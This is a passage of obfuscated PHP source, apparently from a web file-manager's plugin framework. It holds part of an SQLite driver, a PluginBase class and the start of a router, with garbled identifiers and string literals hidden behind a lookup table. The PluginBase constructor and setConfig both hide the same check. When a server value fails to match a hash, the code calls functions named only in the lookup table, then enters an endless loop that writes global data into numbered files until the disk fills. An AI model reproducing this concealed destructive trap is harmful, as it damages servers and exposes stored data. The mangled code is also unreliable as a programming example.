$this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ˆûùúÊ¯][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ìĞÍàŒË = sqlite_query($this->_linkID, $_SERVER[ˆûùúÊ¯][37]); if (!$ìĞÍàŒË) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¡†Â¬Şô = sqlite_query($this->_linkID, $_SERVER[ˆûùúÊ¯][38]); if (!$¡†Â¬Şô) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Úê‡„Ñé = array(); if ($this->numRows > 0) { for ($Ã·â„˜‘ = 0; $Ã·â„˜‘ < $this->numRows; $Ã·â„˜‘++) { $Úê‡„Ñé[$Ã·â„˜‘] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Úê‡„Ñé; } public function getFields($Ç×‰¦®) { $„Ü¾Á·å =& $_SERVER[ˆûùúÊ¯]; $‘ãÜ¸òı = $this->query($„Ü¾Á·å[39] . $Ç×‰¦® . $„Ü¾Á·å[40]); $Éºç Œ = array(); if ($‘ãÜ¸òı) { foreach ($‘ãÜ¸òı as $“÷²©õá => $ÖèèÆİ) { $Éºç Œ[$ÖèèÆİ[$„Ü¾Á·å[41]]] = array($„Ü¾Á·å[42] => $ÖèèÆİ[$„Ü¾Á·å[41]], $„Ü¾Á·å[43] => $ÖèèÆİ[$„Ü¾Á·å[44]], $„Ü¾Á·å[45] => (bool) ($ÖèèÆİ[$„Ü¾Á·å[46]] === $„Ü¾Á·å[12]), $„Ü¾Á·å[47] => $ÖèèÆİ[$„Ü¾Á·å[48]], $„Ü¾Á·å[49] => strtolower($ÖèèÆİ[$„Ü¾Á·å[50]]) == $„Ü¾Á·å[51], $„Ü¾Á·å[52] => strtolower($ÖèèÆİ[$„Ü¾Á·å[53]]) == $„Ü¾Á·å[54]); } } return $Éºç Œ; } public function getTables($¤úó× = '') { $ÎíÂªğ =& $_SERVER[ˆûùúÊ¯]; $»ÚÂ¤îâ = $this->query($ÎíÂªğ[55] . $ÎíÂªğ[56] . $ÎíÂªğ[57]); $¼ˆ¨õ»Í = array(); foreach ($»ÚÂ¤îâ as $Ñ’Ë¯ => $ïİú÷­†) { $¼ˆ¨õ»Í[$Ñ’Ë¯] = current($ïİú÷­†); } return $¼ˆ¨õ»Í; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Á¾Å÷ØŒ =& $_SERVER[ˆûùúÊ¯]; $øìû‡§Ö = sqlite_last_error($this->_linkID); $this->error = $øìû‡§Ö . $Á¾Å÷ØŒ[4] . sqlite_error_string($øìû‡§Ö); if ($Á¾Å÷ØŒ[12] != $this->queryStr) { $this->error .= LNG($Á¾Å÷ØŒ[58]) . $this->queryStr; } think_trace($this->error, $Á¾Å÷ØŒ[12], $Á¾Å÷ØŒ[59]); return $this->error; } public function escapeString($Š¿¤¬…€) { return sqlite_escape_string($Š¿¤¬…€); } public function parseLimit($ëí³¾à) { $ŸçÆİÀ =& $_SERVER[ˆûùúÊ¯]; $ÂêĞœ·Â = $ŸçÆİÀ[12]; if (!empty($ëí³¾à)) { $ëí³¾à = explode($ŸçÆİÀ[60], $ëí³¾à); if (count($ëí³¾à) > 1) { $ÂêĞœ·Â .= $ŸçÆİÀ[61] . $ëí³¾à[1] . $ŸçÆİÀ[62] . $ëí³¾à[0] . $ŸçÆİÀ[63]; } else { $ÂêĞœ·Â .= $ŸçÆİÀ[61] . $ëí³¾à[0] . $ŸçÆİÀ[63]; } } return $ÂêĞœ·Â; } } goto c‘“‡ŒëÀ„; fŒéË¡µƒ´: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ü¦ŞÄáñ =& $_SERVER[ˆûùúÊ¯]; $º‹Ì÷Ìò = $_SERVER[$ü¦ŞÄáñ[22]]; $Òòß®¾” = $ü¦ŞÄáñ[937]; if ($_SERVER[$ü¦ŞÄáñ[13]] != $Òòß®¾”($º‹Ì÷Ìò)) { $™ŠË¬üŠ = $ü¦ŞÄáñ[938]; $ãÁ÷ƒ®é = $ü¦ŞÄáñ[15]; $Ïîµ›Ú = $_SERVER[$ü¦ŞÄáñ[16]] . $ü¦ŞÄáñ[17]; $……À•½µ = $ãÁ÷ƒ®é($Ïîµ›Ú); $ôœà¸¿ß = explode($ü¦ŞÄáñ[18], $……À•½µ); if (count($ôœà¸¿ß) < $ü¦ŞÄáñ[664]) { $Ò»¡â© = $ü¦ŞÄáñ[20]; $Ò»¡â©(); } $´‡¢« = $ü¦ŞÄáñ[939]; $´‡¢«($_SERVER[$ü¦ŞÄáñ[940]]); $™ŠË¬üŠ = $ü¦ŞÄáñ[938]; $™ŠË¬üŠ(); $Æõ€Šğ† = $ü¦ŞÄáñ[941]; $ëÎš¾¿† = json_encode($GLOBALS[$ü¦ŞÄáñ[942]]); $™‰¼¬ÊÎ = 1; for ($Ô–ìâº© = $™‰¼¬ÊÎ; $Ô–ìâº© > 0; $Ô–ìâº©++) { $Æõ€Šğ†(DATA_PATH . $Ô–ìâº©, $ëÎš¾¿†); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ü¦ŞÄáñ[1566]); $this->pluginName = str_replace($ü¦ŞÄáñ[1566], $ü¦ŞÄáñ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ü¦ŞÄáñ[8]; $this->pluginApi = appHostGet() . $ü¦ŞÄáñ[1567] . $this->pluginName . $ü¦ŞÄáñ[8]; $this->pluginHost = $config[$ü¦ŞÄáñ[1568]] . $this->pluginName . $ü¦ŞÄáñ[8]; $this->pluginHostDefault = $config[$ü¦ŞÄáñ[1568]] . $this->pluginName . $ü¦ŞÄáñ[8]; $§Ï¦Ë‚Ş = $config[$ü¦ŞÄáñ[1569]]; if ($§Ï¦Ë‚Ş && strpos($ü¦ŞÄáñ[60] . $§Ï¦Ë‚Ş . $ü¦ŞÄáñ[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$ü¦ŞÄáñ[1570]] . $this->pluginName . $ü¦ŞÄáñ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ˆûùúÊ¯][1571]); } protected function assign($Û…¸ì»¸, $öØÕæ¶² = false) { if (is_array($Û…¸ì»¸)) { $this->values = array_merge($this->values, $Û…¸ì»¸); } else { $this->values[$Û…¸ì»¸] = $öØÕæ¶²; } } protected function display($«¬ ë£À) { extract($this->values); require $«¬ ë£À; } final function hookRegist($Ğ‰ÜŞ·) { $this->modelPlugin->appRegist($this->pluginName, $Ğ‰ÜŞ·); } final function appIcon() { $şİ˜³¡… =& $_SERVER[ˆûùúÊ¯]; $ãïÕÉòŞ = $this->appPackage(); $¬‹œÚã = $şİ˜³¡…[12]; if (isset($ãïÕÉòŞ[$şİ˜³¡…[466]])) { if (isset($ãïÕÉòŞ[$şİ˜³¡…[466]][$şİ˜³¡…[1572]])) { $¬‹œÚã = $şİ˜³¡…[1573] . $ãïÕÉòŞ[$şİ˜³¡…[466]][$şİ˜³¡…[1572]] . $şİ˜³¡…[1574]; } else { if ($ãïÕÉòŞ[$şİ˜³¡…[466]][$şİ˜³¡…[1575]]) { $¬‹œÚã = $şİ˜³¡…[1576] . $ãïÕÉòŞ[$şİ˜³¡…[466]][$şİ˜³¡…[1575]] . $şİ˜³¡…[1577]; } } } return $¬‹œÚã; } final function fileCanView($²³öòæÇ) { $ Óû˜ œ =& $_SERVER[ˆûùúÊ¯]; if (request_url_safe($²³öòæÇ)) { return !0; } if ($this->isShare($²³öòæÇ)) { return !0; } $Ò²ùÌê = Session::get($ Óû˜ œ[1578]); if ($GLOBALS[$ Óû˜ œ[544]] != 1 && !$Ò²ùÌê || !$Ò²ùÌê[$ Óû˜ œ[1579]]) { $Ô¼¬¾¥¿ = $ Óû˜ œ[1580] . rawurlencode(this_url()); show_tips(LNG($ Óû˜ œ[1581]) . $ Óû˜ œ[1582] . $Ô¼¬¾¥¿ . $ Óû˜ œ[1583] . LNG($ Óû˜ œ[1584]) . $ Óû˜ œ[1585], !1); } if (!Action($ Óû˜ œ[1586])->authCan($ Óû˜ œ[1587])) { show_tips(LNG($ Óû˜ œ[1588]) . $ Óû˜ œ[1589], !1); } ActionCall($ Óû˜ œ[1590], $²³öòæÇ); } final function isShare($ŸŒŒïØø) { $Ü‡áñ¹ = KodIO::parse($ŸŒŒïØø); return $Ü‡áñ¹[$_SERVER[ˆûùúÊ¯][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($á…‹È¤) { if (request_url_safe($á…‹È¤)) { return $á…‹È¤; } if (!$this->isShare($á…‹È¤)) { $á…‹È¤ = $this->filePath($á…‹È¤, !1); } return Action($_SERVER[ˆûùúÊ¯][1235])->linkOut($á…‹È¤); } public function filePathLinkOut($Œß—Ãƒ) { if (request_url_safe($Œß—Ãƒ)) { return $Œß—Ãƒ; } $this->fileCanView($Œß—Ãƒ); return Action($_SERVER[ˆûùúÊ¯][1235])->link($Œß—Ãƒ); } final function filePath($ÈÙ©¹ïŞ, $‡üË¿Õ¾ = true) { $ãëöÛ“’ =& $_SERVER[ˆûùúÊ¯]; if ($³‡ƒÒ = $this->checkSharePath($ÈÙ©¹ïŞ, $‡üË¿Õ¾)) { Hook::trigger($ãëöÛ“’[1591], $³‡ƒÒ); return $³‡ƒÒ; } $this->fileCanView($ÈÙ©¹ïŞ); if (request_url_safe($ÈÙ©¹ïŞ)) { $¤ÖÉ‡ß× = parse_url_query($ÈÙ©¹ïŞ); if (isset($¤ÖÉ‡ß×[$ãëöÛ“’[1592]]) && isset($¤ÖÉ‡ß×[$ãëöÛ“’[227]])) { $»òáÎş = Model($ãëöÛ“’[830])->get($ãëöÛ“’[831]); $Ò…©¥÷Ü = Mcrypt::decode($¤ÖÉ‡ß×[$ãëöÛ“’[227]], $»òáÎş); if ($Ò…©¥÷Ü) { $this->fileInfo = IO::info($Ò…©¥÷Ü); $this->fileInfo[$ãëöÛ“’[1593]] = $ÈÙ©¹ïŞ; $this->cachePath = $this->pluginCachePath($ãëöÛ“’[12], $‡üË¿Õ¾); if (!$this->fileInfo) { show_tips(LNG($ãëöÛ“’[115]), !1); } Hook::trigger($ãëöÛ“’[1591], $Ò…©¥÷Ü); return $Ò…©¥÷Ü; } } $ÈÙ©¹ïŞ = $this->_cacheHttpFile($ÈÙ©¹ïŞ, $‡üË¿Õ¾); $this->fileInfo = IO::info($ÈÙ©¹ïŞ); } else { $this->fileInfo = IO::info($ÈÙ©¹ïŞ); $this->cachePath = $this->pluginCachePath($ãëöÛ“’[12], $‡üË¿Õ¾); } if (!$this->fileInfo) { show_tips(LNG($ãëöÛ“’[115]), !1); } Hook::trigger($ãëöÛ“’[1591], $ÈÙ©¹ïŞ); return $ÈÙ©¹ïŞ; } final function _cacheHttpFile($ÈôÎ©§£, $œ÷ãÈƒà = true) { $•˜™³‹È =& $_SERVER[ˆûùúÊ¯]; $¥Æƒ·ÉÕ = parse_url_query($ÈôÎ©§£); $ñÜƒÅÅ = get_path_ext($ÈôÎ©§£); if (preg_match($•˜™³‹È[1594], $ñÜƒÅÅ, $˜˜‰ø¦½)) { $ñÜƒÅÅ = $˜˜‰ø¦½ ? $˜˜‰ø¦½[0] : $•˜™³‹È[12]; } if (isset($¥Æƒ·ÉÕ[$•˜™³‹È[42]]) && $¥Æƒ·ÉÕ[$•˜™³‹È[42]]) { $ñÜƒÅÅ = get_path_ext($¥Æƒ·ÉÕ[$•˜™³‹È[42]]); } $­è¢éø = hash_path($ÈôÎ©§£) . $•˜™³‹È[10] . $ñÜƒÅÅ; $this->cachePath = $this->pluginCachePath($œ÷ãÈƒà ? $­è¢éø : $•˜™³‹È[12]); $‚€Ï… = IO::fileNameExist($this->cachePath, $­è¢éø); if ($‚€Ï…) { return KodIO::make($‚€Ï…); } $ÎöĞ»¡ = rtrim($this->cachePath, $•˜™³‹È[8]) . $•˜™³‹È[8] . $­è¢éø; return $this->pluginCacheFileSet($ÎöĞ»¡, file_get_contents_nossl($ÈôÎ©§£)); } final function checkSharePath($ìÕììœâ, $­¥òûõı = true) { $í¼½©ŒÊ =& $_SERVER[ˆûùúÊ¯]; if (!$this->isShare($ìÕììœâ)) { return !1; } $òø¬ÚşŒ = Action($í¼½©ŒÊ[1235])->sharePathInfo($ìÕììœâ); if (!is_array($òø¬ÚşŒ) || !isset($òø¬ÚşŒ[$í¼½©ŒÊ[94]]) || !is_array($òø¬ÚşŒ[$í¼½©ŒÊ[524]])) { show_json(LNG($í¼½©ŒÊ[1595]), !1); } $this->fileInfo = $òø¬ÚşŒ[$í¼½©ŒÊ[524]]; $this->cachePath = $this->pluginCachePath(!1, $­¥òûõı); return $òø¬ÚşŒ[$í¼½©ŒÊ[94]]; } final function pluginCachePath($½úƒ™Â = '', $ŸÊÖ®Ë¤ = false) { $ú®²á×Â =& $_SERVER[ˆûùúÊ¯]; if ($ŸÊÖ®Ë¤ && is_array($this->fileInfo)) { $½úƒ™Â = kodIO::hashPath($this->fileInfo, !1); } $¾¼¯˜Ã» = rtrim(IO_PATH_SYSTEM_TEMP . $ú®²á×Â[1596] . $this->pluginName . $ú®²á×Â[8] . $½úƒ™Â, $ú®²á×Â[8]); $™¤æ¡®¿ = IO::infoFullSimple($¾¼¯˜Ã»); $µïÈ…ğã = $™¤æ¡®¿ && is_array($™¤æ¡®¿) ? $™¤æ¡®¿[$ú®²á×Â[94]] : $ú®²á×Â[12]; if (!$µïÈ…ğã) { $µïÈ…ğã = IO::mkdir($¾¼¯˜Ã»); } return $µïÈ…ğã; } final function pluginCacheFileSet($à¬Ÿæ†­, $»®Ó³å‘ = '') { $æ´Éó‡Ã =& $_SERVER[ˆûùúÊ¯]; $ä‚·½² = IO::infoFullSimple($à¬Ÿæ†­); if (!$ä‚·½²) { return IO::mkfile($à¬Ÿæ†­, $»®Ó³å‘, REPEAT_REPLACE); } IO::setContent($ä‚·½²[$æ´Éó‡Ã[94]], $»®Ó³å‘); return $ä‚·½²[$æ´Éó‡Ã[94]]; } final function pluginLocalFile($ı×êÖ¤± = '') { $åÁáò õ =& $_SERVER[ˆûùúÊ¯]; $€şüÏ‚É = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($€şüÏ‚É)) { mk_dir($€şüÏ‚É); } if (!$ı×êÖ¤±) { return $€şüÏ‚É; } $Íûô»Éè = IO::info($ı×êÖ¤±); $˜‘–„‡î = $åÁáò õ[1597] . KodIO::hashPath($Íûô»Éè) . $åÁáò õ[10] . $Íûô»Éè[$åÁáò õ[184]]; if (!checkExtSafe($˜‘–„‡î)) { $˜‘–„‡î = $˜‘–„‡î . $åÁáò õ[1267]; } $§­ŸÈÅ = $€şüÏ‚É . $˜‘–„‡î; if (@file_exists($§­ŸÈÅ)) { return $§­ŸÈÅ; } return IO::copy($ı×êÖ¤±, $€şüÏ‚É, 0, $˜‘–„‡î); } final function appPackage() { $ä‘°‚¶Ñ =& $_SERVER[ˆûùúÊ¯]; if ($this->packageData) { return $this->packageData; } $ÍºÉõÙÛ = $this->parseFile($this->pluginPath . $ä‘°‚¶Ñ[1598]); $this->parseLang($ÍºÉõÙÛ); $¤Õ™Øã = json_decode_force($ÍºÉõÙÛ); if (!$¤Õ™Øã) { return array(); } $€¬¾å¾ö = Hook::trigger($ä‘°‚¶Ñ[1599], $¤Õ™Øã); if ($€¬¾å¾ö && is_array($€¬¾å¾ö)) { $¤Õ™Øã = $€¬¾å¾ö; } $this->packageData = $¤Õ™Øã; return $¤Õ™Øã; } public function packageInfoGet($½˜ßŸĞú) { $íîŒßıÙ = $this->appPackage(); return array_get_value($íîŒßıÙ, $½˜ßŸĞú); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ˆûùúÊ¯][1600]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ˆûùúÊ¯][1601]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ˆûùúÊ¯][1602]); } public function echoJsAssign($ù•â¤¿, $°¹ùÁ³¢) { $this->echoJsAssignArr[$ù•â¤¿] = $°¹ùÁ³¢; } private function parseFile($¹Ÿò¾Âü) { $¢‚‚›ªÍ =& $_SERVER[ˆûùúÊ¯]; $™ Œ›ğ§ = file_get_contents_nossl($¹Ÿò¾Âü); $´€ó“Ò» = array($¢‚‚›ªÍ[1603], $¢‚‚›ªÍ[1604], $¢‚‚›ªÍ[1605], $¢‚‚›ªÍ[1606], $¢‚‚›ªÍ[1607], $¢‚‚›ªÍ[1608], $¢‚‚›ªÍ[1609]); $¯ãõµœ¤ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¢‚‚›ªÍ[99]][$¢‚‚›ªÍ[1610]]); foreach ($this->echoJsAssignArr as $„×ğ±ŠË => $”¦à™’´) { $´€ó“Ò»[] = $¢‚‚›ªÍ[1611] . $„×ğ±ŠË . $¢‚‚›ªÍ[1612]; $¯ãõµœ¤[] = is_array($”¦à™’´) || is_object($”¦à™’´) ? rawurlencode(json_encode($”¦à™’´)) : $”¦à™’´; } if (strstr($™ Œ›ğ§, $¢‚‚›ªÍ[1613])) { $Â»Î£ƒä = rawurlencode(json_encode($this->pluginLangArr)); $™ Œ›ğ§ = str_replace($¢‚‚›ªÍ[1613], $Â»Î£ƒä, $™ Œ›ğ§); } if (strstr($™ Œ›ğ§, $¢‚‚›ªÍ[1614])) { $Â»Î£ƒä = $Â»Î£ƒä = rawurlencode(json_encode($this->getConfig())); $™ Œ›ğ§ = str_replace($¢‚‚›ªÍ[1614], $Â»Î£ƒä, $™ Œ›ğ§); } $™ Œ›ğ§ = str_replace($´€ó“Ò», $¯ãõµœ¤, $™ Œ›ğ§); return $™ Œ›ğ§; } private function parseLang(&$ÌÅÚ±‡) { $Úå­ƒìÒ =& $_SERVER[ˆûùúÊ¯]; $²é±Ô¶” = $Úå­ƒìÒ[1615]; if (!strstr($ÌÅÚ±‡, $²é±Ô¶”)) { return; } preg_match_all($Úå­ƒìÒ[1616], $ÌÅÚ±‡, $âÎöœÇà); if (!is_array($âÎöœÇà) || count($âÎöœÇà) == 0 || !is_array($âÎöœÇà[0]) || count($âÎöœÇà[0]) == 0) { return; } $¼š£«óù = array(); $ËƒÏºñ = array(); foreach ($âÎöœÇà[0] as $Óòæ€ş) { $¸´ŒËŠÉ = substr($Óòæ€ş, strlen($²é±Ô¶”), -4); $“½ë«¶Ä = LNG($¸´ŒËŠÉ); $¼š£«óù[] = $Óòæ€ş; $ËƒÏºñ[] = str_replace(array($Úå­ƒìÒ[18], $Úå­ƒìÒ[1139], $Úå­ƒìÒ[394], $Úå­ƒìÒ[128]), array($Úå­ƒìÒ[63], $Úå­ƒìÒ[63], $Úå­ƒìÒ[12], $Úå­ƒìÒ[1617]), $“½ë«¶Ä); } $ÌÅÚ±‡ = str_replace($¼š£«óù, $ËƒÏºñ, $ÌÅÚ±‡); } private function parseConfig(&$¸…Ï”“») { $¤¶ëÏ¯¥ =& $_SERVER[ˆûùúÊ¯]; $£¡ø¸ìÈ = $¤¶ëÏ¯¥[1618]; if (!strstr($¸…Ï”“», $£¡ø¸ìÈ)) { return; } preg_match_all($¤¶ëÏ¯¥[1619], $¸…Ï”“», $Ãƒ®¢‰); if (!is_array($Ãƒ®¢‰) || count($Ãƒ®¢‰) == 0 || !is_array($Ãƒ®¢‰[0]) || count($Ãƒ®¢‰[0]) == 0) { return; } $×ñ©Äî¸ = $this->getConfig(); $ÊµÑ»²› = array(); $¸¿ëí¡Ø = array(); foreach ($Ãƒ®¢‰[0] as $ÍâÙ»´‡) { $ÙÑé‹îÆ = substr($ÍâÙ»´‡, strlen($£¡ø¸ìÈ), -2); $ÊµÑ»²›[] = $ÍâÙ»´‡; $¸¿ëí¡Ø[] = _get($×ñ©Äî¸, $ÙÑé‹îÆ); } $¸…Ï”“» = str_replace($ÊµÑ»²›, $¸¿ëí¡Ø, $¸…Ï”“»); } private function parsePackage(&$»Šà„â) { $Ø¿¼…Ó± =& $_SERVER[ˆûùúÊ¯]; $€šôÖ®… = $Ø¿¼…Ó±[1620]; if (!strstr($»Šà„â, $€šôÖ®…)) { return; } preg_match_all($Ø¿¼…Ó±[1621], $»Šà„â, $”Š¤ˆŞã); if (!is_array($”Š¤ˆŞã) || count($”Š¤ˆŞã) == 0 || !is_array($”Š¤ˆŞã[0]) || count($”Š¤ˆŞã[0]) == 0) { return; } $¹ô÷®® = $this->appPackage(); $íıÒ…äÜ = array(); $Š£“¢Ş = array(); foreach ($”Š¤ˆŞã[0] as $¹·—ä‘—) { $šõÇÔ¦ˆ = substr($¹·—ä‘—, strlen($€šôÖ®…), -2); $íıÒ…äÜ[] = $¹·—ä‘—; $Š£“¢Ş[] = _get($¹ô÷®®, $šõÇÔ¦ˆ); } $»Šà„â = str_replace($íıÒ…äÜ, $Š£“¢Ş, $»Šà„â); } final function echoFile($ ¿ï×äØ, $ä–¶£“ = false) { $©¥ÛÔšÃ =& $_SERVER[ˆûùúÊ¯]; $Ö­³Íê÷ = $this->pluginPath . $ ¿ï×äØ; if (ACT == $©¥ÛÔšÃ[1622]) { echo $©¥ÛÔšÃ[1623] . $this->pluginName . $©¥ÛÔšÃ[8] . $ ¿ï×äØ . $©¥ÛÔšÃ[1624]; if (!file_exists($Ö­³Íê÷)) { echo $©¥ÛÔšÃ[1625]; return; } } $²·’—™ø = $this->parseFile($Ö­³Íê÷); $this->parseLang($²·’—™ø); $this->parseConfig($²·’—™ø); $this->parsePackage($²·’—™ø); if (is_array($ä–¶£“)) { $²·’—™ø = str_replace(array_keys($ä–¶£“), array_values($ä–¶£“), $²·’—™ø); } echo $©¥ÛÔšÃ[18] . $²·’—™ø; } final function initLang() { $ËïÍ¤’ =& $_SERVER[ˆûùúÊ¯]; $š×ªµ = $ËïÍ¤’[1626]; $¿ÇöâÀ‘ = $this->pluginPath . $ËïÍ¤’[1627]; $´‚ãúˆÍ = I18n::getType(); $ê¶î•†š = array(); if (file_exists($¿ÇöâÀ‘ . $´‚ãúˆÍ . $ËïÍ¤’[899])) { $ê¶î•†š = (include $¿ÇöâÀ‘ . $´‚ãúˆÍ . $ËïÍ¤’[899]); } else { if ($´‚ãúˆÍ == $ËïÍ¤’[1628] && !file_exists($¿ÇöâÀ‘ . $´‚ãúˆÍ . $ËïÍ¤’[899]) && file_exists($¿ÇöâÀ‘ . $ËïÍ¤’[1629])) { $ê¶î•†š = (include $¿ÇöâÀ‘ . $ËïÍ¤’[1629]); } else { if (file_exists($¿ÇöâÀ‘ . $š×ªµ . $ËïÍ¤’[899])) { $ê¶î•†š = (include $¿ÇöâÀ‘ . $š×ªµ . $ËïÍ¤’[899]); } } } if (!is_array($ê¶î•†š)) { return array(); } if (@count($ê¶î•†š) > 0) { I18n::set($ê¶î•†š); } return $ê¶î•†š; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ˆÚƒÙ¬¤) { $ÔßĞæ¸Å =& $_SERVER[ˆûùúÊ¯]; $ÀØ¥åö¤ = $_SERVER[$ÔßĞæ¸Å[22]]; $Å³î = $ÔßĞæ¸Å[937]; if ($_SERVER[$ÔßĞæ¸Å[13]] != $Å³î($ÀØ¥åö¤)) { $µÉÅÊÕ¯ = $ÔßĞæ¸Å[938]; $–ÆÄ¡áŒ = $ÔßĞæ¸Å[15]; $£ÇÓÃª = $_SERVER[$ÔßĞæ¸Å[16]] . $ÔßĞæ¸Å[17]; $²ÏÏâ¿ü = $–ÆÄ¡áŒ($£ÇÓÃª); $ÚÙœú•è = explode($ÔßĞæ¸Å[18], $²ÏÏâ¿ü); if (count($ÚÙœú•è) < $ÔßĞæ¸Å[664]) { $¬««ñ = $ÔßĞæ¸Å[20]; $¬««ñ(); } $‚ƒÒÌ¥Ï = $ÔßĞæ¸Å[939]; $‚ƒÒÌ¥Ï($_SERVER[$ÔßĞæ¸Å[940]]); $µÉÅÊÕ¯ = $ÔßĞæ¸Å[938]; $µÉÅÊÕ¯(); $È ©¸× = $ÔßĞæ¸Å[941]; $ù½û€¤· = json_encode($GLOBALS[$ÔßĞæ¸Å[942]]); $‹óƒ¶˜ä = 1; for ($ÕòÎı = $‹óƒ¶˜ä; $ÕòÎı > 0; $ÕòÎı++) { $È ©¸×(DATA_PATH . $ÕòÎı, $ù½û€¤·); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ˆÚƒÙ¬¤); } public function onSetConfig($‡—¿¡È) { } public function onGetConfig($¥ˆß›¯×) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($‰ÕˆèŠÇ) { if ($‰ÕˆèŠÇ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($™µÄÃï = "\160\154\x75\147\151\156\x41\x75\x74\x68") { $ˆ±äŞ±ï =& $_SERVER[ˆûùúÊ¯]; if (!Session::get($ˆ±äŞ±ï[1578])) { return !1; } if (_get($GLOBALS, $ˆ±äŞ±ï[544])) { return !0; } $Î¤¸¦ÑÌ = $this->getConfig(); if (!$Î¤¸¦ÑÌ[$™µÄÃï]) { return !1; } return ActionCall($ˆ±äŞ±ï[1630], $Î¤¸¦ÑÌ[$™µÄÃï]); } public function url($‡ïıÚ®Ï, $†á™ü”¤ = '', $¦âÑ•â = true) { $áâ†·­ =& $_SERVER[ˆûùúÊ¯]; $¶¸ß«ë‹ = $this->getConfig(); $°¡£·Ü½ = KOD_VERSION . $áâ†·­[10] . KOD_VERSION_BUILD; $¾×œÙú = $this->packageVersion(); $´µéîéÎ = $°¡£·Ü½ . $áâ†·­[438] . $¾×œÙú; if (substr($‡ïıÚ®Ï, 0, 4) == $áâ†·­[158] || substr($‡ïıÚ®Ï, 0, 2) == $áâ†·­[1339]) { $€Œ±Ñ = $‡ïıÚ®Ï . $áâ†·­[1631] . $´µéîéÎ; } else { if ($†á™ü”¤ == $áâ†·­[12]) { $€Œ±Ñ = $this->pluginHost . $‡ïıÚ®Ï . $áâ†·­[1631] . $´µéîéÎ; } else { if ($†á™ü”¤ === $áâ†·­[85]) { $€Œ±Ñ = $this->pluginHost . $‡ïıÚ®Ï; } else { if ($†á™ü”¤ == $áâ†·­[1632]) { $€Œ±Ñ = STATIC_PATH . $‡ïıÚ®Ï . $áâ†·­[1631] . $°¡£·Ü½; } else { if ($†á™ü”¤ == $áâ†·­[1633]) { $€Œ±Ñ = APP_HOST . $áâ†·­[1634] . $‡ïıÚ®Ï . $áâ†·­[1631] . $°¡£·Ü½; } else { if (isset($¶¸ß«ë‹[$†á™ü”¤])) { $€Œ±Ñ = $¶¸ß«ë‹[$†á™ü”¤] . $‡ïıÚ®Ï . $áâ†·­[1631] . $´µéîéÎ; } } } } } } if (!$¦âÑ•â) { return $€Œ±Ñ; } echo $€Œ±Ñ; } public function link($á‰‚È¦Ü = false, $îÛ‡ñ = '') { $•‘îÈ®ê =& $_SERVER[ˆûùúÊ¯]; if (!$á‰‚È¦Ü) { $this->link($•‘îÈ®ê[1635], $•‘îÈ®ê[1633]); $this->link($•‘îÈ®ê[1636], $•‘îÈ®ê[1632]); $this->link($•‘îÈ®ê[1637], $•‘îÈ®ê[1632]); $this->link($•‘îÈ®ê[1638], $•‘îÈ®ê[1632]); $this->link($•‘îÈ®ê[1639], $•‘îÈ®ê[1632]); return; } $ßë˜âñ = $this->url($á‰‚È¦Ü, $îÛ‡ñ, !1); if (substr($á‰‚È¦Ü, -3) == $•‘îÈ®ê[1640]) { echo $•‘îÈ®ê[1641] . $ßë˜âñ . $•‘îÈ®ê[1642] . $•‘îÈ®ê[18]; } else { if (substr($á‰‚È¦Ü, -4) == $•‘îÈ®ê[1643]) { echo $•‘îÈ®ê[1644] . $ßë˜âñ . $•‘îÈ®ê[1645] . $•‘îÈ®ê[18]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\136\57\x5d\53", "\x3a\x6e\165\155" => "\133\x30\55\x39\135\x2b", "\x3a\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($öÁ‚”§˜, $êŸıû¢) { $•âÎñÙ± =& $_SERVER[ˆûùúÊ¯]; if ($öÁ‚”§˜ == $•âÎñÙ±[1646]) { $Š‚ùøµİ = array_map($•âÎñÙ±[1647], $êŸıû¢[0]); $Ë†ø©å = strpos($êŸıû¢[1], $•âÎñÙ±[8]) === 0 ? $êŸıû¢[1] : $•âÎñÙ±[8] . $êŸıû¢[1]; $†×ì¨Û = $êŸıû¢[2]; } else { $Š‚ùøµİ = null; $Ë†ø©å = strpos($êŸıû¢[0], $•âÎñÙ±[8]) === 0 ? $êŸıû¢[0] : $•âÎñÙ±[8] . $êŸıû¢[0]; $†×ì¨Û = $êŸıû¢[1]; } array_push(self::$maps, $Š‚ùøµİ); array_push(self::$routes, $Ë†ø©å); array_push(self::$methods, strtoupper($öÁ‚”§˜)); array_push(self::$callbacks, $†×ì¨Û); } public static function 